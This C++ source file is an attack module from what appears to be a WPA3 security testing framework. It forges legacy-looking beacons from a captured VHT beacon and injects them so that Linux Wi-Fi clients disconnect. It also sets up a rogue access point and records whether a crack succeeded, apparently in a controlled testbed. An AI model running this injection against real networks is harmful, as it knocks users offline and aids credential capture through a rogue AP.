#include "attacks/DoS_soft/expected_vht_beacon/expected_vht_beacon.h"

#include <chrono>
#include <thread>
#include <tins/tins.h>

#include "attacks/components/setup_connections.h"
#include "interrupt.h"
#include "logger/error_log.h"
#include "logger/log.h"
#include "logger/log_util.h"
#include "observer/dmesg_wrapper.h"
#include "observer/tshark_wrapper.h"
#include "scan/active/scan_AP.h"
#include "visual/result_helper.h"

namespace wpa3_tester::expected_vht_beacon_attack {
using namespace std;
using namespace chrono;
using namespace Tins;

// Build a legacy-looking beacon from a real VHT beacon:
// keeps only the IEs visible in the target frame (SSID, rates, DS, TIM, RSN, op-classes)
// sets capabilities to ESS+ShortPreamble (0x0011), drops VHT_CAP / VHT_OP and everything else.

// mac80211 then fires "AP appears to change mode (expected VHT, found legacy)" and disconnects (on 2_4GHz)
// on 5GHz not disconnect without similar log
static Dot11Beacon build_legacy_beacon(const Dot11Beacon &src) {
	Dot11Beacon result(src.addr1(), src.addr2());
	result.addr3(src.addr3());
	result.interval(src.interval());
	result.timestamp(src.timestamp());
	result.capabilities().ess(true);
	result.capabilities().short_preamble(true);

	for(const auto &opt: src.options()) {
		switch(static_cast<Dot11::OptionTypes>(opt.option())) {
		case Dot11::SSID:
		case Dot11::SUPPORTED_RATES:
		case Dot11::DS_SET:
		case Dot11::TIM:
		case Dot11::RSN:
		case Dot11::SUPPORTED_OP_CLASSES: result.add_option(opt); break;
		default: break; // drops VHT_CAP, VHT_OP, HT_*, ext-rates
		}
	}
	return result;
}

static void inject_legacy_beacons(
		const HWAddress<6> &ap_mac, const string &iface, const int attack_time_sec, const int ms_interval) {
	log(LogLevel::INFO, "Scanning for AP beacon on {}", iface);
	const auto real_beacon = scan::RSN_scan(iface, 20, ap_mac);
	if(!real_beacon) throw run_err("expected_vht_beacon: AP beacon not found - check channel and AP MAC");

	log(LogLevel::INFO, "Beacon captured, stripping VHT IEs and injecting");
	const Dot11Beacon legacy = build_legacy_beacon(*real_beacon);
	RadioTap rt;
	rt.inner_pdu(legacy);

	PacketSender sender{ iface };
	const auto end = steady_clock::now() + seconds(attack_time_sec);
	while(steady_clock::now() < end && !g_interrupted.load()) {
		sender.send(rt);
		this_thread::sleep_for(milliseconds(ms_interval));
	}
}

// ---- module entry points ----

void setup_attack(RunStatus &rs) {
	components::client_ap_setup(rs, false);
	components::setup_rogue_ap(rs);
}

void run_attack(RunStatus &rs) {
	const auto &att_cfg = rs.config().at("attack_config");
	const string iface = rs.get_actor("attacker").get(SK::iface);
	const HWAddress<6> ap_mac(rs.get_actor("ap").get(SK::mac));

	const int attack_time = att_cfg.at("attack_time_sec").get<int>();
	const int ms_interval = att_cfg.at("ms_interval").get<int>();

	rs.start_observers();

	interruptible_sleep(seconds(att_cfg.at("sleep_before_sec")));
	if(g_interrupted.load()) return;

	log(LogLevel::INFO, "Attack START");
	inject_legacy_beacons(ap_mac, iface, attack_time, ms_interval);
	log(LogLevel::INFO, "Attack END");

	interruptible_sleep(seconds(att_cfg.at("sleep_after_sec")));
	rs.process_manager.stop_all();
}

void stats_attack(const RunStatus &rs) {
	vector<unique_ptr<GraphElements>> elements;
	rs.log_events(elements, { DISCONNECT, CONNECT, TESTER_TAGS });

	auto [rogue_ap_connected, crack_result] = visual::helper::hostapd_mana_crack(rs, elements);

	observer::tshark::pcap_events(rs,
			elements,
			{
					{ "client", "wlan.fc.type_subtype == 0x08", "Beacon", "orange" },
			});
	observer::tshark::tshark_graph(rs, "client", elements);

	const auto window = visual::helper::get_run_window(rs);
	const int disconnects = static_cast<int>(get_time_logs(rs, "client", "CTRL-EVENT-DISCONNECTED", window).size());
	const auto oc =
			observer::dmesg::grep_log(rs.run_folder() / "observer" / "dmesg" / "dmesg.log", "appears to change mode");

	nlohmann::json result;
	result["disconnect_count"] = disconnects;
	result["dmesg_change_mode_disconnect"] = !oc.empty();
	result["ap_disconnected"] = !get_time_logs(rs, "ap", "AP-STA-DISCONNECTED", window).empty();
	if(rogue_ap_connected) result["rogue_ap_connected"] = *rogue_ap_connected;
	if(crack_result) result["cracked"] = crack_result->cracked != 0;
	rs.save_result(result);
}

}
